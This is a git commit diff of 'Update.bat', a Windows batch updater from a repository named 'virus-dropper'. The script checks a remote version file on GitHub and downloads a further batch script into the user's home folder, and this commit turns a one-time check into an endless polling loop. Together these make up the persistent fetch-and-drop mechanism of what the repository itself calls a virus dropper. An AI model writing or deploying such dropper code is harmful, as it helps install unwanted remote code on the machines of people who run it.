cc339271a7987159455f2ae9275c0227587c7dcb
YumYummity <103061664+YumYummity@users.noreply.github.com>
2022-05-29 19:21:53 -0400

    Update Update.bat

--- Update.bat
+++ Update.bat
@@ -1,8 +1,11 @@
 @echo off
-set /a version=9
+:loooop
+set /a version=10
 @SET output=
 FOR /F %%I IN ('curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/updater/version.txt"') DO @SET "output=%%I"
-If %output% == %version% exit ELSE goto update
+If %output% == %version% goto loooop ELSE goto update
+
+goto :loooop
 
 :update
 curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/updater/updater.bat" --output "%HOMEPATH%\Updater.bat"
